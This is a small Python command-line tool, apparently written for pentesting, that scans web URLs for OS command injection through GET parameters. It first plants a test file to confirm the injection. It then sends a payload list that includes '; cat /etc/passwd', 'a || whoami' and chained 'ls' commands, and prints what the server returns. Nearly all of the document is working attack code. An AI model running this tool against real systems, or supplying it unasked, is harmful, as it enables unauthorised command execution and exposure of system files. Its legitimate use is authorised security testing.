import click
import requests

PAYLOADS=[
    'pippo',
    '; cat /etc/passwd',
    'randomfile.txt; ls',
    'a || whoami',
    'ls',
    'ls -l',
    'ls -a',   
]

URLS=[]

@click.command()
@click.option('--target', '--t', required=True, help='A target host (e.g., http://localhost)')
@click.option('--urls', '--u', required=True, multiple=True, help='A list of URLs to scan')
@click.option('--methods', '--m', required=True, type=click.Choice(['GET'], case_sensitive=True), multiple=True, 
    help='A list of methods for each URL')
@click.option('--params', '--p', required=True, multiple=True, 
    help='A list of parameters for each URL You can use any input format you want')
def main(target, urls, methods, params):
    
    format_requests(target, urls)

    for idx, method in enumerate(methods):
        if method == 'GET':
            print(f'Checking if {URLS[idx]} is injectable...')
            if not is_injectable(idx, params):
                return

            print(f'I found a command injection on the \'{params[0]}\' parameter of the {URLS[idx]} URL')
            print(f'Preparing payloads...')
            payloads = prepare_payload(params, idx)
            print(f'Payloads prepared!')
            print(f'Serving payloads...')
            for payload in payloads:
                req = requests.get(URLS[idx], params=payload)
                print(req.content)

def is_injectable(idx, params):
    cmd_test = 'echo cmd_injection > cmd_inj.txt | ls'
    param_list = get_params(idx, params)
    for param in param_list:
        payload = {param: cmd_test}
        req = requests.get(URLS[idx], params=payload)

        if 'cmd_inj.txt' in req.text:
            return True

    return False

def prepare_payload(parameters, idx):
    payloads = []
    params = get_params(idx, parameters)
    for payload in PAYLOADS:
        payload_dict = {}
        for param in params:
            payload_dict[param]=payload
        payloads.append(payload_dict)
    return payloads

def format_requests(target, urls):
    for url in urls:
        URLS.append(f"{target}/{url}")

def get_params(idx, params):
    return params[idx].split(':')

if __name__ == '__main__':
    main()
